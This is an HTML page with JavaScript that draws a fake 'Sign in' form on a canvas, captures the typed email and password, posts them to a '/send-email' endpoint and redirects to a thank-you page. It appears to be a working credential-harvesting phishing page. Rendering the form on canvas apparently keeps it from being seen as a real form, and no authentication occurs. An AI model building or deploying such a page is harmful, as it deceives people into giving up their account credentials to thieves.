<!DOCTYPE html>
<html>
<head>
  <title>Canvas Login</title>
  <style>
    body, html { margin: 0; padding: 0; overflow: hidden; }
    canvas { display: block; }
  </style>
</head>
<body>
<canvas id="canvas"></canvas>
<script>
const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");

canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

let bg = new Image();
bg.src = 'background2.jpg';

const inputs = {
  email: { x: 60, y: 240, w: 360, h: 35, text: "", active: false },
  password: { x: 60, y: 300, w: 360, h: 35, text: "", active: false }
};
const button = { x: 60, y: 370, w: 360, h: 50, text: "Sign in" };

function draw() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  ctx.drawImage(bg, 0, 0, canvas.width, canvas.height);
  for (let key in inputs) {
    let box = inputs[key];
    ctx.fillStyle = box.active ? "#ffffff" : "#f0f0f0";
    ctx.fillRect(box.x, box.y, box.w, box.h);
    ctx.strokeStyle = "#999";
    ctx.strokeRect(box.x, box.y, box.w, box.h);
    ctx.fillStyle = "#000";
    ctx.font = "16px Arial";
    ctx.fillText(box.text, box.x + 10, box.y + 24);
  }
  ctx.fillStyle = "#0072ce";
  ctx.fillRect(button.x, button.y, button.w, button.h);
  ctx.fillStyle = "#fff";
  ctx.font = "bold 18px Arial";
  ctx.textAlign = "center";
  ctx.fillText(button.text, button.x + button.w / 2, button.y + 32);
  ctx.textAlign = "left";
}
bg.onload = () => draw();

canvas.addEventListener("mousedown", e => {
  const mx = e.offsetX, my = e.offsetY;
  for (let key in inputs) {
    const box = inputs[key];
    box.active = mx > box.x && mx < box.x + box.w && my > box.y && my < box.y + box.h;
  }

  // Button click
  if (mx > button.x && mx < button.x + button.w && my > button.y && my < button.y + button.h) {
    const data = {
      email: inputs.email.text,
      password: inputs.password.text
    };
    fetch("/send-email", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(data)
    }).then(() => {
      window.location.href = "/thank-you.html";
    });
  }

  draw();
});

document.addEventListener("keydown", e => {
  for (let key in inputs) {
    let box = inputs[key];
    if (box.active) {
      if (e.key === "Backspace") box.text = box.text.slice(0, -1);
      else if (e.key.length === 1) box.text += e.key;
    }
  }
  draw();
});
</script>
</body>
</html>

